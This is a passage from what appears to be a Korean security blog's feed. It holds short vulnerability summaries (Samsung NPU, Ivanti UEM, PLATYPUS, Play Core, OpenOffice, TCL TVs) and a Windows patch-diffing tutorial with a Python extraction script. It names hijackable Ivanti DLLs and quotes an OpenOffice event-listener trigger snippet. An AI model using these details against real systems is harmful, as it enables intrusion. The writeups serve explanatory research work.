    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2073">Samsung NPU (Neural Processing Unit) memory corruption in shared memory parsing</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Samsung’s Exynos-based devices (including Neural Processing Unit)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>삼성의 엑시노스 모바일 프로세서에 포함된 NPU(Neural Processing Unit)는 머신러닝 연산에 사용됩니다. 이러한 NPU의 Neural Network Feature Maps를 패키징하는데 사용되는 <code>NCP</code> 구조체의 입력 값 검증을 하지 않아 memory corruption이 발생하는 취약점이 발견되었습니다.</p><p>Convolution Neural Network Feature Maps(IFM / OFM)을 패키징하는 <code>npu_session_s_graph</code> 에서는 먼저<code>__get_session_info</code> 를 호출해 사용자 영역 ION 메모리 버퍼를 커널 메모리에 매핑합니다.</p><blockquote><p>ION - process 간 메모리 공유를 위한 메모리 할당자</p></blockquote><p>그리고 <code>__config_sesison_info</code>를 호출해 매핑된 메모리를 파싱하는데, 아래와 같은 과정에서 취약점을 트리거할 수 있습니다.</p><ol><li><code>__pilot_parsing_ncp</code> 에서 <code>temp_IFM_av</code> 버퍼의 크기는 사용자 영역 공유 메모리에서 가져온  <code>ncp-&gt; memory_vector_cnt</code> 을 사용해 먼저 계산됩니다.</li><li>TOCTOU 버그를 트리거해 사용자 영역에서 <code>ncp-&gt; memory_vector_cnt</code> 의 값을 더 큰 값으로 변경합니다.</li><li>이후 <code>__second_parsing_ncp</code> 에서 <code>ncp-&gt; memory_vector_cnt</code> 를 다시 읽어 <code>temp_IFM_av</code> 버퍼에 복사합니다.</li><li>2단계에서 큰 값으로 변경된 <code>ncp-&gt; memory_vector_cnt</code> 로 인해 <code>temp_IFM_av</code> 버퍼의 사이즈보다 더 많은 값을 복사하게 되고 이때 bounds check를 하지 않아 heap buffer overflow가 발생합니다.</li></ol><p>해당 취약점을 이용하면 커널 스레드 스택을 포함해 vmap의 커널 버퍼 범위를 벗어나 데이터를 쓸 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>toctou</tag>
      
      <tag>samsung</tag>
      
      <tag>L0ch</tag>
      
      <tag>npu</tag>
      
      <tag>neural processing unit</tag>
      
      <tag>heap buffer overflow</tag>
      
      <tag>exynos</tag>
      
      <tag>shared memory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Two Privilege Escalation Vulnerability in Ivanti Unified Endpoint Manager</title>
    <link href="/2020/11/16/idioth/2020-11-16/"/>
    <url>/2020/11/16/idioth/2020-11-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.jumpsec.com/detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/">Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Unified Endpoint Manager &lt;= 2020.1.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><strong>CVE-2020-13770: Named pipe token impersonation</strong></p><p>해당 취약점은 프로세스가 named pipe object를 열 때 보안 attribute가 부적절하여 발생한 취약점입니다. </p><p><code>CreateFile</code>의 <code>dwFlagsAndAttributes</code> 인자가 아래와 같은 attribute일 때 취약점이 발생합니다.</p><ul><li>SECURITY_DELEGATION</li><li>SECURITY_IMPERSONATION</li></ul><p>위의 두 attribute 중 하나로 named pipe를 열면 서버는 클라이언트 토큰을 얻고 추후 access check에 사용합니다. pipe 서버는 pipe 클라이언트의 권한, security context 등을 사용할 수 있으므로 서버보다 클라이언트의 권한이 높으면 서버는 권한 상승을 할 수 있습니다.</p><p><strong>CVE-2020-13771: DLL search order hijacking</strong></p><p>해당 취약점은 윈도우의 <a href="https://docs.microsoft.com/ko-kr/windows/win32/dlls/dynamic-link-library-search-order">DLL Search Order</a>를 이용한 취약점입니다. <code>SafeDllSearchMode</code> 설정에 관계없이 프로세스가 DLL 파일을 찾지 못하면 환경 변수 PATH에서 파일을 찾습니다. 해커가 환경 변수에 등록된 폴더에 조작된 DLL 파일을 배치하면 취약한 프로세스가 해당 DLL을 로드하고 그 프로세스의 context로 <code>DllMain</code>이 실행되어 권한상승을 할 수 있습니다. 해당 프로그램에서 악용할 수 있는 dll 파일은 아래와 같습니다.</p><ul><li>ldprofileui.dll</li><li>wfapi.dll</li><li>DMIAPI32.DLL</li><li>logonsrv.dll</li><li>OOBCredentials.dll</li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>lpe</tag>
      
      <tag>named pipe</tag>
      
      <tag>idioth</tag>
      
      <tag>dll hijacking</tag>
      
      <tag>dll search order</tag>
      
      <tag>impersonation attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing 맛보기 Part 1</title>
    <link href="/2020/11/15/l0ch/windows-patch-diffing-part1/"/>
    <url>/2020/11/15/l0ch/windows-patch-diffing-part1/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요! L0ch입니다. 저번 <a href="https://hackyboiz.github.io/2020/11/01/l0ch/cve-2020-1464/">GlueBall 취약점</a> 글 썼을 때 디핑 할 버전별 바이너리를 구하다가 멘탈이 파쇄기에 갈린 종이마냥 갈릴 뻔했죠?</p><p>생각해보니까 괜히 Diffing 하겠다고 건드렸다가 X고생했는데 이대로 가만히 있으면 왠지 억울하자나여. 그래서 이 참에 좀 쉽게 쉽게 갈 수 있는 방법을 찾느라 방황하던 중 엄청난 글을 발견하게 되는데..</p><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p><p>이거 완전 나를 위한 글이잖아??ㅎ</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/1.png"></p><p>그래서! 바로 정리에 들어갔죠. 앞으로 할 삽질은 꿈에도 모른 채 ㅋㅋ 아</p><h1 id="Diffing-이-뭔데"><a href="#Diffing-이-뭔데" class="headerlink" title="Diffing 이 뭔데?"></a>Diffing 이 뭔데?</h1><p>간단하게 Binary Diffing이 뭔지 짚고 넘어가 봅시다!</p><blockquote><p>Diffing 은 일반적으로 컴퓨터에서 두 개 파일의 차이를 보여주는 용어다. (Ex : git diff - Git의 소스코드 difference 확인) 바이너리 분석 기법(Binary Diffing)으로도 쓰이는데, 패치 또는 업데이트된 바이너리와 기존 바이너리를 비교해서 어떤 코드가 변경되었는지, 어떤 함수가 추가되고 제거되었는지 등 버전 별 바이너리의 차이점을 알 수 있는 분석 기법이다.</p></blockquote><p>한마디로 얘네가 뭐를 어떻게 패치했나~ 바뀐 부분만 쓱 둘러보는 분석 기법입니다. 별 거 없어 보이지만 Diffing을 하면서 패치로 인해 발생한 새로운 취약점이나, 기존 취약점에 대해 적용한 패치를 우회하는 새로운 방법 등을 효율적으로 찾을 수 있습니다. 오늘은 앞서 말한 것처럼 Windows Update 패치를 추출하고 추출한 업데이트 파일을 이용해 Diffing을 진행해 볼게요.</p><h1 id="Windows-Update-Package"><a href="#Windows-Update-Package" class="headerlink" title="Windows Update Package"></a>Windows Update Package</h1><h2 id="Microsoft-Update-Catalog"><a href="#Microsoft-Update-Catalog" class="headerlink" title="Microsoft Update Catalog"></a>Microsoft Update Catalog</h2><p>윈도우는 업데이트 패키지를 배포해 실행하는 방식으로 패치를 합니다.</p><p>Windows 10 기준으로 버전 별로 나누어 배포하고 있으며 오늘은 다음 환경에서 진행합니다.</p><pre><code class="hljs markdown">Windows 10 ver1903, 64bit</code></pre><p>버전에 따라 받아야 하는 업데이트 파일이 다르니 참고하시면 됩니다!</p><p>기본적으로 윈도우는 자동 업데이트 방식을 사용하지만 윈도우 카탈로그에서 독립 실행형 패치 패키지를 받아 수동 설치할 수도 있습니다.</p><p>윈도우 카탈로그 : <a href="https://www.catalog.update.microsoft.com/Home.aspx">https://www.catalog.update.microsoft.com/Home.aspx</a></p><p>Windows 카탈로그는 다음과 같은 형식의 검색 기능을 제공합니다.</p><pre><code class="hljs lisp">YYYY-MM release-number (<span class="hljs-name">x86</span><span class="hljs-name">|x64|</span><span class="hljs-name">ARM64</span>) cumulative</code></pre><p>제 윈도우는 1903, 64bit 이므로 8월 업데이트를 찾기 위해 아래 키워드로 검색을 해볼게요.</p><pre><code class="hljs angelscript"><span class="hljs-number">2020</span><span class="hljs-number">-08</span> <span class="hljs-number">1903</span> x64 cumulative</code></pre><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/2.png"></p><p>검색을 하면 이렇게 업데이트 목록들이 주르륵 뜨는데, Diffing 하길 원하는 파일이 패치된 업데이트 항목을 받으면 됩니다. 전 <code>KB4565351</code> 을 받도록 할게요.</p><h1 id="Extract-Update-Package"><a href="#Extract-Update-Package" class="headerlink" title="Extract Update Package"></a>Extract Update Package</h1><p>업데이트 파일을 다운로드하면 <code>msu</code> 확장명의 업데이트 패키지를 받을 수 있습니다.</p><p>이 패키지에서 파일들을 추출해내면 됩니다.</p><h2 id="Extract-msi"><a href="#Extract-msi" class="headerlink" title="Extract msi"></a>Extract msi</h2><p>PowerShell에서 <code>expand.exe -F:* &quot;[msu file name]&quot; .\\ext\\</code> 명령어로 패치 컨텐츠들을 추출하면 아래 사진과 같이 ext 폴더 안에 추출된 파일들이 있는 걸 볼 수 있습니다~</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/3.png"></p><p>cab파일이 보이는군요, 이것도  역시 expand로 쓱싹 추출하도록 하죠!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/4.png"></p><p>..?? 왜 아무 반응이 없지..?</p><p>아 왜 안되나 했더니 좀 오래 걸리나 보군요 기다려 봅시다 ㅎ</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/5.png"></p><p>그렇게 <del>2000년 같은</del> 한 시간이 지나고.. 한 20분 정도 기다리다가 포기하고 저녁 먹고 오니까 끝나 있네요?</p><p>아니 뭐 추출 얼마나 한다고 이렇게 오래 걸리냐 하고 추출한 파일 개수를 세 봤는데</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/6.png"></p><p>?? 3만개요?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/7.png"></p><p><em>아니 미친 ㅎㅎ</em></p><p>누적 업데이트 패키지라 지금까지의 업데이트들이 모두 포함되어 있어 이렇게 많다고 하네요…? 추출은 밥때 맞춰서 돌려놓고 밥 먹고 오면 될 것 같습니다ㅋㅋ;</p><h2 id="Extracted-files"><a href="#Extracted-files" class="headerlink" title="Extracted files"></a>Extracted files</h2><p><code>tree /F &gt;&gt; extract.txt</code> 명령어로 어떤 파일들이 추출 되었는지 트리 구조로 확인해 보도록 하죠!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/8.png"></p><p>다양한 형식의 파일, 폴더들이 추출된 것을 볼 수 있네요.</p><ol><li><p>폴더 유형</p><p>접두어로 아키텍처가 붙음</p><ul><li>amd64, x86, wow64, msil</li></ul></li><li><p>파일 유형</p><ul><li>manie</li><li>cat : 보안 카탈로그</li><li>mum : 카탈로그 파일과 쌍을 이루며 메타 데이터가 포함됨</li></ul></li></ol><p>그런데.. 각 패치 폴더 안에 f랑 r 폴더가 있고, 이 안에 각각 같은 이름의 바이너리가 보이는데, 이게 뭘까요..?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/9.png"></p><p>f, r 각 폴더는 Differential 폴더로, 세 가지 유형이 있습니다.</p><ul><li>f: forward differential</li><li>r: reverse differential</li><li>n: null differential</li></ul><p>이들은 기본 버전에서 변경될 업데이트 파일과의 차이만큼의 내용을 담고 있는 파일입니다. 이 부분은 중요한 내용이라 나중에 다시 짚어 보도록 할 테니, 꼭 기억해 두세요!</p><h2 id="WinSxS"><a href="#WinSxS" class="headerlink" title="WinSxS"></a>WinSxS</h2><p>Windows는 Windows와 WinSxS를 통해 바이너리뿐만 아니라 모든 종류의 파일을 업데이트할 수 있습니다.</p><p>WinSxS는 manifest를 참조해 패치하며 manifest에는 패치 적용 방법, 결과 파일의 권한, 설정할 레지스트리 키 등 업데이트에 대한 전반적인 리스트 정보가 있어요. 간단하게 확인해 볼까요?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/10.png"></p><p>Windows-Gaming-XboxLive-Storage-Service-Component에 대한 manifest 정보를 조회한 결과입니다.</p><p>differential 폴더인 f, r가 있고, 각각에 패치될 dll과 exe 바이너리가 있는 걸 확인할 수 있어요.</p><h1 id="추출-자동화"><a href="#추출-자동화" class="headerlink" title="추출 자동화"></a>추출 자동화</h1><p>그런데 말입니다. 다 좋은데.. 추출한 파일 리스트를 좀 보려고 했더니 아키텍처 별로 분류도 없고 뒤죽박죽 개판이라 짜증 나려고 하네,,^^</p><blockquote><p>날로 먹기 좋아하는 L0ch는 바로 추출/분류 자동화 스크립트를 짜기로 합니다. 역시 원 게시글에도 스크립트가 있군요!<br>기쁜 표정으로 스크립트를 살펴본 L0ch의 표정이 어두워집니다. 무슨 일이죠? 아 ! 파워쉘로 짠 스크립트네요!<br>저런… 애석하게도 L0ch는 파워쉘을 해본 적이 없습니다. 눈물을 머금고 파이썬으로 새로 작성하는 방법밖에 없겠군요.</p></blockquote><pre><code class="hljs python"><span class="hljs-comment">#F**k PowerShell </span><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> timeps_path = <span class="hljs-string">&#x27;C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe &#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_dir</span>(<span class="hljs-params">dir</span>):</span><span class="hljs-keyword">try</span>:<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span>(os.path.isdir(dir)):os.makedirs(os.path.join(dir))<span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:<span class="hljs-keyword">if</span> e.errno != errno.EEXIST:print(<span class="hljs-string">&quot;Failed to create directory&quot;</span>)<span class="hljs-keyword">raise</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_msu</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;*.msu&quot; ./ext/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_cab</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;./ext/Windows*.cab&quot; ./patch/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">move_files</span>(<span class="hljs-params">dir, filename</span>):</span><span class="hljs-keyword">try</span>:os.popen(<span class="hljs-string">&#x27;move ./patch/&#x27;</span>+filename+<span class="hljs-string">&#x27; ./&#x27;</span>+dir)<span class="hljs-keyword">except</span>:print(<span class="hljs-string">&quot;Failed to move file&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">classification</span>():</span>output = os.popen(<span class="hljs-string">&#x27;dir /ad /b patch&#x27;</span>).read()patch_list = output.split(<span class="hljs-string">&#x27;\\n&#x27;</span>)print(<span class="hljs-string">&quot;File classification&quot;</span>)<span class="hljs-keyword">for</span> idx, patch <span class="hljs-keyword">in</span> enumerate(patch_list):<span class="hljs-keyword">if</span> idx + <span class="hljs-number">1</span> % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:print(<span class="hljs-string">&quot;(&quot;</span>+str(idx)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)time.sleep(<span class="hljs-number">0.01</span>)platform = patch[:<span class="hljs-number">5</span>]<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;msil&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;MSIL&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;wow64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;WOW64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;amd64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;x86&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x86&#x27;</span>, patch)print(<span class="hljs-string">&quot;(&quot;</span>+str(idx + <span class="hljs-number">1</span>)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)<span class="hljs-comment"># JUNK</span>os.popen(<span class="hljs-string">&#x27;move patch JUNK&#x27;</span>)os.popen(<span class="hljs-string">&#x27;cd ext &amp;&amp; move *.txt ../&#x27;</span>)os.popen(<span class="hljs-string">&#x27;echo y | rmdir /s ext &gt; nul&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:dir_list = [<span class="hljs-string">&#x27;ext&#x27;</span>,<span class="hljs-string">&#x27;patch&#x27;</span>,<span class="hljs-string">&#x27;MSIL&#x27;</span>,<span class="hljs-string">&#x27;WOW64&#x27;</span>,<span class="hljs-string">&#x27;x64&#x27;</span>,<span class="hljs-string">&#x27;x86&#x27;</span>]<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> dir_list:create_dir(d)extract_msu()extract_cab()classification()print(<span class="hljs-string">&quot;Done&quot;</span>)time.sleep(<span class="hljs-number">3</span>)</code></pre><p>PowerShell 써보려고 했는데 10분만에 때려치고 걍 익숙한 파이썬 썼습니다ㅋㅋ. 익숙한 게 최고야</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/11.png"></p><blockquote><p>파이썬 최고다악!! </p></blockquote><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/12.png"></p><p>msu에서 cab파일을 추출하고, 위 사진과 같이 cab에서 추출한 파일들을 각 아키텍처 폴더에 분류했습니다.<br>.manifest와 .mum, .cat 파일은 들여다볼 일이 거의 없기 때문에 JUNK로 분류를 했구요.</p><p>이렇게 분류해서 정리된 모습을 보니 편안하군요. 역시 사람은 정리를 하고 살아야 돼<br>아 그래서 제 방은 정리하고 사냐구요? 그럴 리가요..?</p><p>분량 조절 실패로.. 다음 글에서는 패치 유형을 알아보고, 본격적으로 Diffing을 해볼게요!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/13.jpg"></p><p>안녕히 계세요 여러분! 전 이 세상의 모든 굴레와 속박을 벗어 던지고 제 행복을 찾아 떠납니다! (대충 술 먹으러 간다는 말)</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Software-based Power Side-Channel Attack on x86</title>
    <link href="/2020/11/14/fabu1ous/2020-11-14/"/>
    <url>/2020/11/14/fabu1ous/2020-11-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://platypusattack.com/">PLATYPUS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Xen</p><p>Intel Processor 다수</p><p>Linux</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>side-channel 정보(power consumption / electro magnetic emission)를 이용해 시스템의 operation 및 data를 유추하는 공격 방법은 세계 2차 대전 때부터 존재했습니다. 지금까지 2가지 한계가 존재했는데 다음과 같습니다.</p><ol><li>고성능의 Desktop이나 server용 CPU 보단 임베디드 마이크로 컨트롤러를 타겟으로 잡음.</li><li>오실로스코프 등을 이용한 하드웨어 기반 공격이 많았고, 소프트웨어 기반 공격의 x86 적용은 크게 성공적이지 못함. ex) RSA key 복구 시도가 2번 있었지만 실패.</li></ol><p>PLATYPUS attack은 소프트웨어 기반 side-channel 공격입니다. Intel RAPL interface에 접근해 power consumption에 대한 정보 축적 후 x86 시스템을 타겟으로 다음과 같은 행위를 할 수 있습니다.</p><ol><li>instruction 분별, control flow monitoring</li><li>AES-NI key 추출(26시간 이내)</li><li>RSA key 복구(100분 이내)</li><li>KASLR 무력화(20초 이내)</li></ol><p>Intel RARL(Running Average Power Limit)의 데이터에 누구나 접근할 수 있고 악용할 수 있습니다. 따라서 power monitoring interface들의 접근권한이 패치됐습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://seclists.org/oss-sec/2020/q4/109">https://seclists.org/oss-sec/2020/q4/109</a></p><p><a href="https://seclists.org/oss-sec/2020/q4/110">https://seclists.org/oss-sec/2020/q4/110</a></p><p><a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html">https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html</a></p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>side-channel attack</tag>
      
      <tag>intel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Persistent arbitrary code execution in Android&#39;s Google Play Core Library</title>
    <link href="/2020/11/13/l0ch/2020-11-13/"/>
    <url>/2020/11/13/l0ch/2020-11-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/971386">CVE-2020-8913 - Persistent arbitrary code execution in Android’s Google Play Core Library</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android Play Core ≤ 1.7.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google API를 통해 사용자가 Play Store에 접근하지 않고 인앱 업데이트를 할 수 있게 해주는 Play Core Library에서 임의 코드 실행이 가능한 취약점이 발견되었습니다. 이 취약점을 악용하면 Play Core Library를 사용하는 모든 안드로이드 앱을 대상으로 임의 코드 실행을 할 수 있습니다.</p><p>취약점이 존재하는 부분은 <code>SplitCompat.install</code> 로, 동일한 기기에 설치된 타사 앱이 임의의 데이터를 broadcast 할 수 있습니다. 이 과정에서 <code>split_id</code> 에 대한 유효성 검사가 없어 path traversal를 통해 원하는 위치에 임의의 파일을 복사할 수 있습니다. 이때 임의 코드를 포함하고 파일명이  <code>config.</code> 로 시작하는 파일을  <code>verified-splits</code> 경로에 복사하면  파일이 앱의 런타임 ClassLoader에 추가되어 해당 앱에서 임의 코드가 실행됩니다. </p><p>공격자는 Play Core Library를 사용하는 앱을 타겟으로 하는 악성 APK를 제작하고, 피해자가 이를 설치하도록 유도해 피해자의 데이터를 탈취하거나 코드 실행이 가능합니다.</p><p>이 취약점은 Google Chrome을 비롯한 인기 앱에서 임의 코드 실행이 가능하다는 점에서 심각한 취약점으로 분류되었습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>arbitrary code execution</tag>
      
      <tag>L0ch</tag>
      
      <tag>google</tag>
      
      <tag>play core library</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13958: Apache OpenOffice RCE</title>
    <link href="/2020/11/12/idioth/2020-11-12/"/>
    <url>/2020/11/12/idioth/2020-11-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links">Apache OpenOffice RCE (CVE-2020-13958)</a></p><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links/blob/master/job-offer-CONFIDENTIAL.odt">PoC File</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache OpenOffice 4.0.0 ~ 4.1.7</li><li>Maybe OpenOffice.org versions</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache OpenOffice 4에서 원격 코드 실행 취약점이 발견되었습니다. 해당 취약점은 LibreOffice에서 발견된 CVE-2019-9847과 유사합니다.</p><p>해당 프로그램에서 <code>script:event-listener</code> 핸들러를 매크로 실행으로 처리하지 않아서 발생한 취약점입니다.</p><p>다음과 같은 스크립트로 구성하여 OpenOffice에서 사용하는 <code>.uno 혹은 .service</code>를 통해 확인창이나 클릭 유도 없이 하이퍼 링크를 통해 URL을 열 수 있습니다.</p><pre><code class="hljs vim">&lt;office:scripts&gt;   &lt;office:event-listeners&gt;    &lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">&quot;ooo:script&quot;</span>xlink:href=<span class="hljs-string">&quot;.uno:OpenHyperlinkOnCursor&quot;</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">&quot;dom:load&quot;</span>/&gt;   &lt;/office:event-listeners&gt;&lt;/office:scripts&gt;</code></pre><p><code>.uno .service</code>를 사용하여 트리거하는 것은 리눅스에서도 동작하지만 code execution으로 이어질만한 것을 찾지 못했다고 합니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/">https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9847">https://nvd.nist.gov/vuln/detail/CVE-2019-9847</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>openoffice</tag>
      
      <tag>libreoffice</tag>
      
      <tag>arbitrary code execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Two CVEs on TCL Android TVs</title>
    <link href="/2020/11/11/fabu1ous/2020-11-11/"/>
    <url>/2020/11/11/fabu1ous/2020-11-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/">Extraordinary Vulnerabilities Discovered in TCL Android TVs</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>TCL android TV </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>TCL android TV에 대한 CVE번호가 2개 발급됐습니다. TCL은 중국 전자제품 회사로 현재 TV 시장에서 3번째로 큰 비중을 차지하고 있습니다. 취약점을 제보한 Sick Codes와 John Jackson은 제조사의 의도가 의심스럽다는 말을 조심스럽게 하고 있습니다. </p><ul><li>CVE-2020-27403 : TV의 7989번 포트에 웹서버가 동작하고 있으며,  단순히 이곳에 접속하는 것 만으로 모든 file system에 접근이 가능합니다.</li><li>CVE-2020-28055 : 악성 apk 등의 local unprivileged attacker가 critical 한 시스템 리소스에 읽기 및 쓰기가 가능합니다.</li></ul><p>7989번 포트는 unassigned port입니다. 즉, 특정한 목적이 부여된 번호가 아니기 때문에 7989번 포트에 http로 file system을 내보낼 이유가 없습니다. 또한 제조사가 TV에 대한 완벽한 원격 제어가  가능합니다.</p><blockquote><p>Please make your own conclusions from our research.</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://sick.codes/sick-2020-009">https://sick.codes/sick-2020-009</a></p><p><a href="https://sick.codes/sick-2020-012">https://sick.codes/sick-2020-012</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android tv</tag>
      
      <tag>tcl</tag>
      
      <tag>tv</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16125: Local Privilege Escalation (LPE) in Ubuntu gdm3</title>
    <link href="/2020/11/10/l0ch/2020-11-10/"/>
    <url>/2020/11/10/l0ch/2020-11-10/</url>
    
